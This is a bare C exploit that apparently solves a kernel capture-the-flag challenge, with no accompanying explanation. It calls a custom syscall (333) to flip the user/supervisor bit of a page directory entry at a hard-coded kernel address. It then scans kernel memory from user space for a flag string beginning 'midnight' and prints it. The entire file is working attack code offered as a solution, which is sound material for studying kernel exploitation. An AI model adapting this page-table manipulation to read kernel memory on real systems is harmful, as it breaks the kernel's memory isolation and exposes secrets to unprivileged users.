#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(void) {

    /* flip U/S bit of PDE (page is 2 MiB direct mapped)*/
    long ret = syscall(333, 0xffff8800018fb0f0ul, 2);
    printf("ret: %ld\n", ret);

    long i = 0xffff880003c20000ul;
    long end = i + 0x30000;

    for(; i < end; i++) {
        char *val = (char*)i;
        if (*val == 'm') {
            char buf[8];
            memcpy(buf, val, 8);
            if (memcmp(buf, "midnight", sizeof(buf)) == 0) {
                printf("%s \n", val);
            }
        }
    }
}
